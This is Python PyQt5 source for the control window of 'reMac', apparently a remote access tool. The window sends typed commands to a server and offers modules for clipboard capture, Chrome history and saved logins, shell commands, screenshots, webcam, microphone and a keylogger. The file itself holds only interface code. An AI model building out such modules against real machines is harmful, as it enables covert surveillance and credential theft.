from PyQt5.QtWidgets import QApplication, QLabel, QWidget, QVBoxLayout, QHBoxLayout, QPushButton, QTextEdit, QLineEdit, QComboBox, QTabWidget
from PyQt5.QtCore import QObject, QThread, pyqtSignal
from PyQt5 import QtGui, QtCore

from apps.server.reMac_server import reMac_server
from apps.client.reMac_client import reMac_client
from libs.LineEdit import LineEdit
from libs.StartServerWorker import StartServerWorker
from libs.StartClientWorker import StartClientWorker

app = QApplication([])
txtOutputServer = QTextEdit()
txtOutputClient = QTextEdit()
txtHost = QLineEdit("192.168.0.49")
txtPort = QLineEdit("6890")


class reMacQtApp:

    sentCommands = []

    myreMac_server = reMac_server()
    myreMac_client = reMac_client()

    cmd_start_server = QPushButton('Start Server')
    cmd_send_command = QPushButton('Send command')


    txtCmdToSend = LineEdit()

    def __init__(self):

        window = QWidget()

        wdgtServer = QWidget()
        layoutServer = QVBoxLayout()
        wdgtClient = QWidget()
        layoutClient = QVBoxLayout()

        layout = QVBoxLayout()
        window.setFixedWidth(710)
        layout.addWidget(QLabel('IP address:'))
        layout.addWidget(txtHost)
        layout.addWidget(QLabel('Port:'))
        layout.addWidget(txtPort)

        self.cmd_start_server.clicked.connect(self.runStartServer)
        layoutServer.addWidget(self.cmd_start_server)

        cmd_start_client = QPushButton('Start Client')
        cmd_start_client.clicked.connect(self.runStartClient)
        layoutClient.addWidget(cmd_start_client)

        cmb_modules = QComboBox()
        cmb_modules.addItems(['Hello World', 'Info', 'Clipboard', 'Chrome history', 'Chrome logins', 'Shell Command',
                              'Screenshot', 'Webcam', '(Keylogger - NOT WORKING!)', 'Microphone', 'Module help'])

        layoutClient.addWidget(cmb_modules)
        layoutClient.addWidget(QLabel('Command / Parameter:'))


        layoutClient.addWidget(self.txtCmdToSend)


        self.cmd_send_command.clicked.connect(self.sendCommand)

        self.txtCmdToSend.returnPressed.connect(self.cmd_send_command.click)
        self.txtCmdToSend.upPressed.connect(self.keyUpPressed)
        self.txtCmdToSend.downPressed.connect(self.keyDownPressed)

        layoutClient.addWidget(self.cmd_send_command)

        tabWdgt = QTabWidget()
        layoutServerOutputLine = QHBoxLayout()
        layoutServerOutputLine.addWidget(QLabel('Output:'))
        cmd_clear_server_output = QPushButton('')
        cmd_clear_server_output.setIcon(QtGui.QIcon('images/empty-set.png'))
        cmd_clear_server_output.setIconSize(QtCore.QSize(16, 16))
        cmd_clear_server_output.setFixedWidth(48)
        cmd_clear_server_output.clicked.connect(self.clear_output_server)
        layoutServerOutputLine.addWidget(cmd_clear_server_output)
        wdgtServerOutputLine = QWidget()
        wdgtServerOutputLine.setFixedHeight(64)
        wdgtServerOutputLine.setLayout(layoutServerOutputLine)
        layoutServer.addWidget(wdgtServerOutputLine)

        layoutServer.addWidget(txtOutputServer)
        wdgtServer.setLayout(layoutServer)
        tabWdgt.addTab(wdgtServer, "Server")

        layoutClientOutputLine = QHBoxLayout()
        layoutClientOutputLine.addWidget(QLabel('Output:'))
        cmd_clear_client_output = QPushButton('')
        cmd_clear_client_output.setIcon(QtGui.QIcon('images/empty-set.png'))
        cmd_clear_client_output.setIconSize(QtCore.QSize(16, 16))
        cmd_clear_client_output.setFixedWidth(48)
        cmd_clear_client_output.clicked.connect(self.clear_output_client)
        layoutClientOutputLine.addWidget(cmd_clear_client_output)
        wdgtClientOutputLine = QWidget()
        wdgtClientOutputLine.setFixedHeight(64)
        wdgtClientOutputLine.setLayout(layoutClientOutputLine)
        layoutClient.addWidget(wdgtClientOutputLine)
        layoutClient.addWidget(txtOutputClient)



        wdgtClient.setLayout(layoutClient)
        tabWdgt.addTab(wdgtClient, "Client")
        layout.addWidget(tabWdgt)

        window.setLayout(layout)
        window.show()
        app.exec()

    sentCmdListCursor = 0

    def keyDownPressed(self):
        if self.sentCmdListCursor < -1:
            self.sentCmdListCursor += 1
            self.txtCmdToSend.setText(self.sentCommands[self.sentCmdListCursor])

    def keyUpPressed(self):
        if (self.sentCmdListCursor - 1) * -1 <= len(self.sentCommands):
            self.sentCmdListCursor -= 1
            self.txtCmdToSend.setText(self.sentCommands[self.sentCmdListCursor])

    def serverStarted(self, ok):
        conHost = "192.168.0.49"
        conPort = "6890"

        # if ok == 1:
        #     print(f"Starting reMacApp Server: {conHost}:{conPort} ...")
        #     self.log_output_server(f"Starting reMacApp Server: {conHost}:{conPort} ...")
        if ok == 2:
            self.cmd_start_server.setText("Stop Server")
            self.log_output_server(f"reMac Server started successfully - Listening on: {conHost}:{conPort}")

    def runStartServer(self):
        # Step 2: Create a QThread object
        self.thread = QThread()
        # Step 3: Create a worker object
        self.worker = StartServerWorker(self)
        # Step 4: Move worker to the thread
        self.worker.moveToThread(self.thread)
        # Step 5: Connect signals and slots
        self.thread.started.connect(self.worker.run)
        self.worker.finished.connect(self.thread.quit)
        self.worker.finished.connect(self.worker.deleteLater)
        self.thread.finished.connect(self.thread.deleteLater)
        self.thread.finished.connect(self.serverStarted)
        self.worker.progress.connect(self.serverStarted)
        self.worker.progressng.connect(self.log_output_server)
        self.thread.start()

        self.thread.finished.connect(
            lambda: self.serverStarted(True)
        )

    def runStartClient(self):
        # Step 2: Create a QThread object
        self.threadClient = QThread()
        # Step 3: Create a worker object
        self.workerClient = StartClientWorker(self)
        # Step 4: Move worker to the thread
        self.workerClient.moveToThread(self.threadClient)
        # Step 5: Connect signals and slots
        self.threadClient.started.connect(self.workerClient.run)

        # self.workerClient.finished.connect(self.threadClient.quit)
        # self.workerClient.finished.connect(self.workerClient.deleteLater)

        # self.thread.finished.connect(self.threadClient.deleteLater)
        # self.thread.finished.connect(self.serverStarted)
        self.workerClient.progress.connect(self.log_output_client)
        # self.workerClient.progressng.connect(self.log_output_server)
        self.threadClient.start()

        # self.threadClient.finished.connect(
        #     lambda: self.serverStarted(True)
        # )

    def startServer(self, prg, prgng):
        shost = txtHost.text()
        sport = txtPort.text()
        prgng.emit(f"Starting reMacApp Server: {shost}:{sport} ...")
        self.myreMac_server.start_server(shost, sport, prg, prgng)

    clientPrg = None

    def startClient(self, prg):
        self.clientPrg = prg
        shost = txtHost.text()
        sport = txtPort.text()
        prg.emit(f"Starting reMacApp Client: {shost}:{sport} ...")
        self.myreMac_client.start_client(shost, sport, prg)

    def sendCommand(self):
        cmd2Send = self.txtCmdToSend.text().strip()
        if cmd2Send == "":
            return
        self.sentCommands.append(cmd2Send)
        self.txtCmdToSend.setText("")
        self.recalledCommand = 0

        shost = txtHost.text()
        sport = txtPort.text()

        self.log_output_client(f'Sending command "{cmd2Send}" to: {shost}:{sport} ...')
        # self.clientPrg.emit(f"Starting reMacApp Client: {shost}:{sport} ...")
        self.myreMac_client.start_client(shost, sport, self.clientPrg, cmd2Send)

    def clear_output_server(self):
        txtOutputServer.setText("")

    def log_output_server(self, msg):
        txtOutputServer.append(msg)

    def clear_output_client(self):
        txtOutputClient.setText("")

    def log_output_client(self, msg):
        txtOutputClient.append(msg)
